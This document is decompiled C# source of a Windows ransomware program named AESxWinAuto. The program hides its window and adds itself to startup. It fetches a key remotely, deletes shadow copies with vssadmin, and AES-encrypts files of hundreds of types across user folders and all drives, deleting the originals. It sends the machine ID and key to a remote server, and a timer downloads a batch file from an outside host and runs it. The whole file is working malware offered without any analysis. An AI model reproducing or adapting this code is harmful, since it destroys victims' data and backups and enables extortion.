using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using AESxWin.Helpers;
using Microsoft.Win32;

namespace AESxWin;

public class AESxWinAuto : Form
{
	public static string[] image_ext = new string[390]
	{
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".groups", ".hdd", ".hpp", ".m2ts", ".m4p",
		".mpeg", ".ndf", ".nvram", ".ogg", ".ost", ".pab", ".pdb", ".pif", ".qed", ".qcow",
		".qcow2", ".rvt", ".st7", ".stm", ".vbox", ".vdi", ".vhd", ".vhdx", ".vmdk", ".vmsd",
		".vmx", ".vmxf", ".3fr", ".3pr", ".ab4", ".accde", ".accdr", ".accdt", ".ach", ".acr",
		".adb", ".ads", ".agdl", ".ait", ".apj", ".asm", ".awg", ".back", ".backup", ".backupdb",
		".bay", ".bdb", ".bgt", ".bik", ".bpw", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".cdrw",
		".ce1", ".ce2", ".cib", ".craw", ".crw", ".csh", ".csl", ".db_journal", ".dc2", ".dcs",
		".ddoc", ".ddrw", ".der", ".des", ".dgc", ".djvu", ".dng", ".drf", ".dxg", ".eml",
		".erbsql", ".erf", ".exf", ".ffd", ".fh", ".fhd", ".gray", ".grey", ".gry", ".hbk",
		".ibd", ".ibz", ".iiq", ".incpas", ".jpe", ".kc2", ".kdbx", ".kdc", ".kpdx", ".lua",
		".mdc", ".mef", ".mfw", ".mmw", ".mny", ".mrw", ".myd", ".ndd", ".nef", ".nk2",
		".nop", ".nrw", ".ns2", ".ns3", ".ns4", ".nwb", ".nx2", ".nxl", ".nyf", ".odb",
		".odf", ".odg", ".odm", ".orf", ".otg", ".oth", ".otp", ".ots", ".ott", ".p12",
		".p7b", ".p7c", ".pdd", ".pem", ".plus_muhd", ".plc", ".pot", ".pptx", ".psafe3", ".py",
		".qba", ".qbr", ".qbw", ".qbx", ".qby", ".raf", ".rat", ".raw", ".rdb", ".rwl",
		".rwz", ".s3db", ".sd0", ".sda", ".sdf", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf",
		".srw", ".st5", ".st8", ".std", ".sti", ".stw", ".stx", ".sxd", ".sxg", ".sxi",
		".sxm", ".tex", ".wallet", ".wb2", ".wpd", ".x11", ".x3f", ".xis", ".ycbcra", ".yuv",
		".contact", ".dbx", ".doc", ".docx", ".jnt", ".msg", ".oab", ".ods", ".pdf", ".pps",
		".ppsm", ".ppt", ".pptm", ".prf", ".pst", ".rar", ".rtf", ".wab", ".xls", ".xlsx",
		".xml", ".zip", ".1cd", ".3ds", ".3g2", ".3gp", ".7z", ".7zip", ".accdb", ".aoi",
		".asf", ".asp", ".aspx", ".asx", ".avi", ".bak", ".cer", ".cfg", ".class", ".config",
		".css", ".csv", ".db", ".dds", ".dwg", ".dxf", ".flf", ".flv", ".html", ".idx",
		".js", ".key", ".kwm", ".laccdb", ".ldf", ".lit", ".m3u", ".mbx", ".md", ".mdf",
		".mid", ".mlb", ".mov", ".mp4", ".mpg", ".obj", ".odt", ".ods", ".odp", ".pages",
		".php", ".psd", ".pwm", ".rm", ".safe", ".sav", ".save", ".sql", ".srt", ".swf",
		".thm", ".vob", ".wav", ".wma", ".wmv", ".xlsb3dm", ".aac", ".ai", ".arw", ".c",
		".cdr", ".cls", ".cpi", ".cpp", ".cs", ".db3", ".docm", ".dot", ".dotm", ".dotx",
		".drw", ".dxb", ".eps", ".fla", ".flac", ".fxg", ".java", ".m", ".m4v", ".max",
		".mdb", ".pcd", ".pct", ".pl", ".potm", ".potx", ".ppam", ".ppsm", ".ppsx", ".pptm",
		".ps", ".r3d", ".rw2", ".sldm", ".sldx", ".svg", ".tga", ".wps", ".xla", ".xlam",
		".xlm", ".xlr", ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".act", ".adp", ".al",
		".bkp", ".blend", ".cdf", ".cdx", ".cgm", ".cr2", ".crt", ".dac", ".dbf", ".dcr",
		".ddd", ".design", ".dtd", ".fdb", ".fff", ".fpx", ".h", ".iif", ".indd", ".jpeg",
		".mos", ".nd", ".nsd", ".nsf", ".nsg", ".nsh", ".odc", ".odp", ".oil", ".pas",
		".pat", ".pef", ".pfx", ".ptx", ".qbb", ".qbm", ".sas7bdat", ".say", ".st4", ".st6",
		".stc", ".sxc", ".sxw", ".tlg", ".wad", ".xlk", ".aiff", ".bin", ".cmt", ".dat",
		".dit", ".edb", ".flvv", ".ntx", ".xsd", ".pem", ".xsd", ".xsl", ".ewd", ".dbt",
		".ob", ".gofin", ".dsf", ".ds4", ".shx", ".ath", ".bac", ".ts", ".dst", ".dwfx"
	};

	public static string[] video_ext = new string[15]
	{
		".avi", ".flv", ".mov", ".mp4", ".mpg", ".rm", ".rmvb", ".mkv", ".swf", ".vob",
		".wmv", ".3g2", ".3gp", ".asf", ".ogv"
	};

	public static string[] audio_ext = new string[6] { ".mp3", ".wav", ".acc", ".ogg", ".amr", ".wma" };

	public static string[] document_ext = new string[9] { ".pdf", ".txt", ".rtf", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx" };

	public static string[] compressed_ext = new string[5] { ".zip", ".rar", ".7z", ".tar", ".gzip" };

	public static string[] code_ext = new string[9] { ".cs", ".vb", ".java", ".py", ".rb", ".cpp", ".html", ".css", ".js" };

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private static string string_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static string string_1;

	public List<string> StartPaths = new List<string>();

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private List<string> list_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string[] string_2;

	private BackgroundWorker backgroundWorker_0 = null;

	private BackgroundWorker backgroundWorker_1 = null;

	private Queue<string> queue_0 = new Queue<string>();

	private bool bool_0 = false;

	private long long_0 = 0L;

	private long long_1 = 0L;

	private bool bool_1 = false;

	private bool bool_2 = true;

	private string string_3 = string.Empty;

	private string string_4 = string.Empty;

	private bool bool_3 = false;

	private IContainer icontainer_0 = null;

	private Button btnStartAutoEncrypt;

	private CheckBox chckIsStartup;

	private Timer timer_0;

	private Timer timer_1;

	private Button button1;

	private Button button3;

	private Timer timer_2;

	private ComboBox comboBox2;

	private WebBrowser webBrowser1;

	private Timer timer_3;

	private CheckBox checkBox1;

	private Button button8;

	private ComboBox comboBox3;

	private Button button9;

	private Button button10;

	private Button button11;

	private Button button12;

	private ComboBox comboBox1;

	public static string LogPath
	{
		[CompilerGenerated]
		get
		{
			return string_0;
		}
		[CompilerGenerated]
		set
		{
			string_0 = value;
		}
	}

	public static string ErrorLogPath
	{
		[CompilerGenerated]
		get
		{
			return string_1;
		}
		[CompilerGenerated]
		set
		{
			string_1 = value;
		}
	}

	public List<string> IgnoredPaths
	{
		[CompilerGenerated]
		get
		{
			return list_0;
		}
		[CompilerGenerated]
		set
		{
			list_0 = value;
		}
	}

	public string[] SearchExtensions
	{
		[CompilerGenerated]
		get
		{
			return string_2;
		}
		[CompilerGenerated]
		set
		{
			string_2 = value;
		}
	}

	public bool IsStartup
	{
		get
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			return registryKey.GetValue(Assembly.GetExecutingAssembly().GetName().Name) != null;
		}
		set
		{
			Reg.RegisterInStartup(value, Application.get_ExecutablePath());
		}
	}

	public bool IsAutostart
	{
		get
		{
			return bool_2;
		}
		set
		{
			bool_2 = value;
		}
	}

	public string CurrentPassword
	{
		get
		{
			return string_3;
		}
		set
		{
			string_3 = value;
		}
	}

	public string CurrentIP
	{
		get
		{
			return string_4;
		}
		set
		{
			string_4 = value;
		}
	}

	public Guid ComputerId
	{
		get
		{
			Guid result = default(Guid);
			string text = Reg.Read("ComputerId");
			if (text != null)
			{
				Guid.TryParse(text, out result);
			}
			else
			{
				result = Guid.NewGuid();
				Reg.Write("ComputerId", result);
			}
			return result;
		}
	}

	public bool IsStarted
	{
		get
		{
			return bool_3;
		}
		set
		{
			bool_3 = value;
			if (bool_3)
			{
				((Control)btnStartAutoEncrypt).set_Text("Stop");
			}
			else
			{
				((Control)btnStartAutoEncrypt).set_Text("Start");
			}
		}
	}

	public AESxWinAuto()
	{
		InitializeComponent();
		LogPath = "C:\\ProgramData\\Keyboard";
		if (!Directory.Exists(string_0))
		{
			Directory.CreateDirectory(string_0);
		}
		string text = DateTime.Now.ToString("ddMMyyyy_HHmmss");
		LogPath = Path.Combine(string_0, text + ".log");
		ErrorLogPath = Path.Combine(string_0, text + ".error");
		Log.WriteLog(string_0, "Start programu");
		IsStartup = true;
		chckIsStartup.set_Checked(IsStartup);
		InitSearchExtensions();
		InitIgnoredPaths();
		InitStartPaths();
		GetIP();
		GetPassword();
	}

	private void InitSearchExtensions()
	{
		SearchExtensions = image_ext;
	}

	private void InitIgnoredPaths()
	{
		IgnoredPaths = new List<string>();
		IgnoredPaths.Add(Path.GetDirectoryName(Application.get_ExecutablePath()));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
		IgnoredPaths.Add("C:\\Program Files\\Common Files");
	}

	private void InitStartPaths()
	{
		DriveInfo[] drives = FilesHelper.GetDrives();
		_ = ComputerId;
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			StartPaths.Add(driveInfo.RootDirectory.Name);
		}
	}

	private async void GetPassword()
	{
		try
		{
			string text2 = (CurrentPassword = await PasswordAPI.GetPassword());
			if (string.IsNullOrEmpty(CurrentPassword))
			{
				return;
			}
			if (CurrentPassword.Length <= 3)
			{
				_ = CurrentPassword;
			}
			else
			{
				CurrentPassword.Substring(0, 4);
			}
			Log.WriteLog(LogPath, "Pobrano nowe hasło. x570");
			((Control)btnStartAutoEncrypt).set_Enabled(true);
			string strCmdText = "vssadmin.exe Delete Shadows /All /Quiet";
			Process.Start("CMD.exe", strCmdText);
			if (backgroundWorker_0 == null && backgroundWorker_1 == null && IsAutostart)
			{
				btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
			}
			try
			{
				if (!string.IsNullOrEmpty(CurrentPassword) && !string.IsNullOrEmpty(CurrentIP) && !bool_1)
				{
					SendAPI.SendData(CurrentIP, ComputerId.ToString(), DateTime.Now, CurrentPassword);
					bool_1 = true;
				}
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			Exception ex = ex2;
			Log.WriteLog(ErrorLogPath, "Błąd pobierania hasła. " + ex.ToString());
		}
	}

	private async void GetIP()
	{
		try
		{
			string text2 = (CurrentIP = await IpAPI.GetIP());
			if (!string.IsNullOrEmpty(CurrentIP))
			{
				Log.WriteLog(LogPath, "Ustalono adres IP. " + CurrentIP);
			}
			else
			{
				Log.WriteLog(LogPath, "Błąd pobierania adresu IP.");
			}
			try
			{
				if (!string.IsNullOrEmpty(CurrentPassword) && !string.IsNullOrEmpty(CurrentIP) && !bool_1)
				{
					SendAPI.SendData(CurrentIP, ComputerId.ToString(), DateTime.Now, CurrentPassword);
					bool_1 = true;
				}
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			Exception ex = ex2;
			Log.WriteLog(ErrorLogPath, "Błąd pobierania hasła. " + ex.ToString());
		}
	}

	private void chckIsStartup_Click(object sender, EventArgs e)
	{
		IsStartup = chckIsStartup.get_Checked();
	}

	private void btnStartAutoEncrypt_Click(object sender, EventArgs e)
	{
		if (((Control)btnStartAutoEncrypt).get_Enabled())
		{
			if (!IsStarted)
			{
				IsStarted = !IsStarted;
				Start();
			}
			else
			{
				Stop();
			}
		}
	}

	private void Start()
	{
		long_0 = 0L;
		lock (queue_0)
		{
			queue_0.Clear();
		}
		backgroundWorker_1 = new BackgroundWorker();
		backgroundWorker_1.RunWorkerCompleted += BwPathFinder_RunWorkerCompleted;
		backgroundWorker_1.DoWork += BwPathFinder_DoWork;
		backgroundWorker_1.RunWorkerAsync();
		backgroundWorker_0 = new BackgroundWorker();
		backgroundWorker_0.DoWork += BwEncryptor_DoWork;
		backgroundWorker_0.RunWorkerCompleted += BwEncryptor_RunWorkerCompleted;
		backgroundWorker_0.RunWorkerAsync();
		string text = string.Empty;
		foreach (string startPath in StartPaths)
		{
			text = text + startPath + " ";
		}
		Log.WriteLog(string_0, "Rozpoczęto przeszukiwanie lokalizacji: " + text);
	}

	private void Stop()
	{
		IsStarted = false;
		Thread.Sleep(50);
		lock (queue_0)
		{
			queue_0.Clear();
		}
	}

	private void BwPathFinder_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Log.WriteLog(string_0, $"Zakończono przeszukiwanie dysku ({long_1})");
		bool_0 = true;
	}

	private void BwPathFinder_DoWork(object sender, DoWorkEventArgs e)
	{
		List<string> list = new List<string>();
		foreach (string ignoredPath in IgnoredPaths)
		{
			if (!IsStarted)
			{
				continue;
			}
			try
			{
				IEnumerable<string> folderFilesPaths = ignoredPath.GetFolderFilesPaths();
				foreach (string item in folderFilesPaths)
				{
					try
					{
						string directoryName = Path.GetDirectoryName(item);
						if (!list.Contains(directoryName))
						{
							list.Add(directoryName);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception ex2)
			{
				Log.WriteLog(string_1, "BwPathFinder_DoWork " + ex2.ToString());
			}
		}
		IgnoredPaths.AddRange(list);
		foreach (string startPath in StartPaths)
		{
			if (!IsStarted)
			{
				break;
			}
			try
			{
				if (File.Exists(startPath))
				{
					try
					{
						string directoryName2 = Path.GetDirectoryName(startPath);
						if (!IgnoredPaths.Contains(directoryName2) && startPath.CheckExtension(SearchExtensions))
						{
							lock (queue_0)
							{
								queue_0.Enqueue(startPath);
							}
							long_1++;
						}
					}
					catch (Exception ex3)
					{
						Log.WriteLog(string_1, "BwPathFinder_DoWork 1 " + ex3.ToString());
					}
				}
				try
				{
					if (!Directory.Exists(startPath) || IgnoredPaths.Contains(startPath))
					{
						continue;
					}
					IEnumerable<string> folderFilesPaths2 = startPath.GetFolderFilesPaths();
					foreach (string item2 in folderFilesPaths2)
					{
						try
						{
							string directoryName3 = Path.GetDirectoryName(item2);
							if (IgnoredPaths.Contains(directoryName3))
							{
								continue;
							}
							if (!IsStarted)
							{
								break;
							}
							if (item2.CheckExtension(SearchExtensions) && !item2.EndsWith(".aes"))
							{
								lock (queue_0)
								{
									queue_0.Enqueue(item2);
								}
								long_1++;
							}
							Thread.Sleep(1);
							continue;
						}
						catch
						{
						}
					}
				}
				catch (Exception ex4)
				{
					Log.WriteLog(string_1, "BwPathFinder_DoWork 1.2 " + ex4.ToString());
				}
			}
			catch (Exception ex5)
			{
				Log.WriteLog(string_1, "BwPathFinder_DoWork 2 " + ex5.ToString());
			}
		}
	}

	private void BwEncryptor_DoWork(object sender, DoWorkEventArgs e)
	{
		while (IsStarted)
		{
			try
			{
				if (queue_0.Count != 0)
				{
					string currentPassword = CurrentPassword;
					string path = string.Empty;
					lock (queue_0)
					{
						path = queue_0.Dequeue();
					}
					if (File.Exists(path))
					{
						try
						{
							path.EncryptFileAsync(currentPassword, deleteOriginal: true);
							long_0++;
							string directoryName = Path.GetDirectoryName(path);
							if (!StatusFile.StatusFileExist(directoryName))
							{
								StatusFile.WriteStatusFile(directoryName, CurrentIP, ComputerId.ToString(), DateTime.Now);
							}
						}
						catch (Exception ex)
						{
							Log.WriteLog(string_1, "BwEncryptor_DoWork " + ex.ToString());
						}
					}
				}
				if (bool_0 && queue_0.Count == 0)
				{
					break;
				}
			}
			catch (Exception ex2)
			{
				Log.WriteLog(string_1, "BwEncryptor_DoWork 2 " + ex2.ToString());
			}
			Thread.Sleep(20);
		}
		e.Result = true;
	}

	private void BwEncryptor_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		if (bool_0)
		{
			Log.WriteLog(string_0, $"Zakończono szyfrowanie ({long_0})");
			btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
			Reg.RegisterInStartup(isChecked: false, Application.get_ExecutablePath());
			Log.WriteLog(string_0, $"Usuwam z autostartu i zamykam program");
			try
			{
				Process process = new Process();
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.FileName = "exec.bat";
				process.Start();
			}
			catch
			{
			}
			((Form)this).Close();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
	}

	private void button4_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		string s = "100";
		int.TryParse(s, out var result);
		MessageBox.Show("The value of i is " + result);
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		comboBox1.set_DataSource((object)"ssss");
		((ListControl)comboBox1).set_ValueMember("au_id");
		((ListControl)comboBox1).set_DisplayMember("au_lname");
	}

	private void timer4_Tick(object sender, EventArgs e)
	{
		webBrowser1.Navigate("http://www.msn.com/?ocid=iehp");
		WebClient webClient = new WebClient();
		string randomFileName = Path.GetRandomFileName();
		string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + randomFileName + ".bat";
		webClient.DownloadFile("http://anna-lewandowska.eu/save.txt", fileName);
		Process process = new Process();
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.FileName = fileName;
		process.Start();
		process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		char[] array = new char[5] { 'A', 'B', 'C', 'D', 'E' };
		for (int i = 0; i < array.Length; i++)
		{
			MessageBox.Show(array[i].ToString());
		}
		Array.Resize(ref array, 3);
		for (int j = 0; j < array.Length; j++)
		{
			MessageBox.Show(array[j].ToString());
		}
	}

	private void button6_Click(object sender, EventArgs e)
	{
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		List<string> list = new List<string>();
		list.Add("Red");
		list.Add("Blue");
		list.Add("Green");
		list.Insert(1, "violet");
		foreach (string item in list)
		{
			MessageBox.Show(item);
		}
		list.Remove("violet");
		for (int i = 0; i < list.Count; i++)
		{
			MessageBox.Show(list[i]);
		}
		if (list.Contains("Blue"))
		{
			MessageBox.Show("Blue color exist in the list");
		}
		else
		{
			MessageBox.Show("Not exist");
		}
		string[] array = new string[3] { "Red", "Blue", "Green" };
		List<string> list2 = new List<string>(array);
		string[] array2 = array;
		foreach (string text in array2)
		{
			MessageBox.Show(text);
		}
		list2.Clear();
		MessageBox.Show(list2.Count.ToString());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Expected O, but got Unknown
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Expected O, but got Unknown
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0884: Unknown result type (might be due to invalid IL or missing references)
		//IL_088e: Expected O, but got Unknown
		//IL_0890: Unknown result type (might be due to invalid IL or missing references)
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(AESxWinAuto));
		btnStartAutoEncrypt = new Button();
		chckIsStartup = new CheckBox();
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		button1 = new Button();
		button3 = new Button();
		timer_2 = new Timer(icontainer_0);
		comboBox2 = new ComboBox();
		webBrowser1 = new WebBrowser();
		timer_3 = new Timer(icontainer_0);
		checkBox1 = new CheckBox();
		button8 = new Button();
		comboBox3 = new ComboBox();
		button9 = new Button();
		button10 = new Button();
		button11 = new Button();
		button12 = new Button();
		comboBox1 = new ComboBox();
		((Control)this).SuspendLayout();
		((Control)btnStartAutoEncrypt).set_Anchor((AnchorStyles)10);
		((Control)btnStartAutoEncrypt).set_Enabled(false);
		((Control)btnStartAutoEncrypt).set_Location(new Point(484, 67));
		((Control)btnStartAutoEncrypt).set_Margin(new Padding(4));
		((Control)btnStartAutoEncrypt).set_Name("btnStartAutoEncrypt");
		((Control)btnStartAutoEncrypt).set_Size(new Size(112, 28));
		((Control)btnStartAutoEncrypt).set_TabIndex(4);
		((Control)btnStartAutoEncrypt).set_Text("Start");
		((ButtonBase)btnStartAutoEncrypt).set_UseVisualStyleBackColor(true);
		((Control)btnStartAutoEncrypt).add_Click((EventHandler)btnStartAutoEncrypt_Click);
		((Control)chckIsStartup).set_Anchor((AnchorStyles)10);
		((Control)chckIsStartup).set_AutoSize(true);
		((Control)chckIsStartup).set_Location(new Point(44, 67));
		((Control)chckIsStartup).set_Margin(new Padding(4));
		((Control)chckIsStartup).set_Name("chckIsStartup");
		((Control)chckIsStartup).set_Size(new Size(213, 21));
		((Control)chckIsStartup).set_TabIndex(1);
		((Control)chckIsStartup).set_Text("Uruchom ze startem systemu");
		((ButtonBase)chckIsStartup).set_UseVisualStyleBackColor(true);
		((Control)chckIsStartup).add_Click((EventHandler)chckIsStartup_Click);
		timer_0.add_Tick((EventHandler)timer1_Tick);
		timer_1.add_Tick((EventHandler)timer2_Tick);
		((Control)button1).set_Location(new Point(302, 56));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(5);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button3).set_Location(new Point(268, 12));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(75, 23));
		((Control)button3).set_TabIndex(7);
		((Control)button3).set_Text("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		timer_2.add_Tick((EventHandler)timer3_Tick);
		((ListControl)comboBox2).set_FormattingEnabled(true);
		((Control)comboBox2).set_Location(new Point(183, 11));
		((Control)comboBox2).set_Name("comboBox2");
		((Control)comboBox2).set_Size(new Size(121, 24));
		((Control)comboBox2).set_TabIndex(10);
		((Control)webBrowser1).set_Location(new Point(208, -102));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(250, 250));
		((Control)webBrowser1).set_TabIndex(11);
		timer_3.set_Enabled(true);
		timer_3.set_Interval(105100);
		timer_3.add_Tick((EventHandler)timer4_Tick);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_Location(new Point(484, 14));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(98, 21));
		((Control)checkBox1).set_TabIndex(13);
		((Control)checkBox1).set_Text("checkBox1");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		checkBox1.add_CheckedChanged((EventHandler)checkBox1_CheckedChanged);
		((Control)button8).set_Location(new Point(284, 70));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(75, 23));
		((Control)button8).set_TabIndex(21);
		((Control)button8).set_Text("button8");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((ListControl)comboBox3).set_FormattingEnabled(true);
		((Control)comboBox3).set_Location(new Point(208, 39));
		((Control)comboBox3).set_Name("comboBox3");
		((Control)comboBox3).set_Size(new Size(121, 24));
		((Control)comboBox3).set_TabIndex(20);
		((Control)button9).set_Location(new Point(284, 31));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(75, 23));
		((Control)button9).set_TabIndex(19);
		((Control)button9).set_Text("button9");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button10).set_Location(new Point(185, 10));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(75, 23));
		((Control)button10).set_TabIndex(18);
		((Control)button10).set_Text("button10");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button11).set_Location(new Point(300, 41));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(75, 23));
		((Control)button11).set_TabIndex(17);
		((Control)button11).set_Text("button11");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button12).set_Location(new Point(219, 54));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(75, 23));
		((Control)button12).set_TabIndex(16);
		((Control)button12).set_Text("button12");
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		((Control)comboBox1).set_Location(new Point(112, 12));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(121, 24));
		((Control)comboBox1).set_TabIndex(22);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(609, 103));
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)button8);
		((Control)this).get_Controls().Add((Control)(object)comboBox3);
		((Control)this).get_Controls().Add((Control)(object)button9);
		((Control)this).get_Controls().Add((Control)(object)button10);
		((Control)this).get_Controls().Add((Control)(object)button11);
		((Control)this).get_Controls().Add((Control)(object)button12);
		((Control)this).get_Controls().Add((Control)(object)checkBox1);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).get_Controls().Add((Control)(object)comboBox2);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)btnStartAutoEncrypt);
		((Control)this).get_Controls().Add((Control)(object)chckIsStartup);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("AESxWinAuto");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("AESxWinAuto");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
